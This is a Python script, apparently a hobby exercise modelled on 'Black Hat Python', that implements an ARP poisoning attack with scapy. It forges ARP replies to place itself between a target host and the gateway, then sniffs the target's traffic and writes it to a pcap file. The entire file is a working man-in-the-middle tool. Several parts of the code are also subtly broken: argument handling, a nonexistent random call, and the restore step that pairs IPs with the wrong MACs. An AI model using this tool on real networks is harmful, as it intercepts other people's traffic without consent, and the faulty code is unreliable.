# Implementation of the ARP Poisoning script inspired from BlackHatPython



import os
import sys
import signal
import threading
from uuid import getnode as get_mac
from scapy.all import *


def get_mac(adress):

	responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=adress), timeout = 2, retry = 10)

	for s,r in responses:
		return r[Ether].src

	return None

def end_poisoning(gateway_ip, gateway_mac, target_ip, target_mac):
	print("Ending the poisoning")

	send(ARP(op=2, psrc = gateway_ip, pdst = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 5)
	send(ARP(op=2, psrc = target_ip, pdst = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 5)

	os.kill(os.getpid(), signal.SIGINT)

def poison(gateway_ip, gateway_mac, target_ip, target_mac):

	target = ARP()
	gateway = ARP()

	target.op = 2
	target.psrc = gateway_ip
	target.pdst = target_ip
	target.hwdst = target_mac

	gateway.op = 2
	gateway.psrc = target_ip
	gateway.pdst = gateway_ip
	gateway.hwdst = gateway_mac

	print ("Let's rock'n'roll")

	while True:
		try:
			send(target)
			send(gateway)

			time.sleep(2)

		except KeyboardInterrupt:
			end_poisoning(gateway_ip, gateway_mac, target_ip, target_mac)

	print("Am I useful ?")
	return

def main():
	print("-----------  This is a simple ARP Poisoning tool (inspired by BlackHatPyton) --------------\r\n")

	if len(sys.argv) != 4:
		print("USAGE : python arpP.py INTERFACE TARGET_IP GATEWAY_IP NUMBER_OF_PACKETS_SNIFFED")
		sys.exit(0)

	interface = sys.argv[0]
	target_ip = sys.argv[1]
	gateway_ip = sys.argv[2]
	number_packets = sys.argv[3]

	conf.iface = interface
	conf.verb = 0

	print("Getting Gateway MAC adress")

	gateway_mac = get_mac(gateway_ip)
	target_mac = get_mac(target_ip)

	if (gateway_mac == None or target_mac == None):
		print("Unable to retrieve MAC Address : sorry :/")
		sys.exit(0)

	poison_thread = threading.Thread(target = poison, args = (gateway_ip, gateway_mac, target_ip, target_mac))
	poison_thread.start()

	try:

		print ("Beginning the sniffing part")
		filter_sniff  = "ip host %s" % target_ip
		packets = sniff(count = number_packets, filter = filter_sniff, iface = interface)
		wrpcap("sniffed_by_arp_" + str(math.random()*1024 + ".pcap", packets))

		end_poisoning(gateway_ip, gateway_mac, target_ip, target_mac)

	except KeyboardInterrupt:
		end_poisoning(gateway_ip, gateway_mac, target_ip, target_mac)
		print("Sniffing interrupted : exiting !")
		sys.exit(0)


	

if __name__ == '__main__':
	main()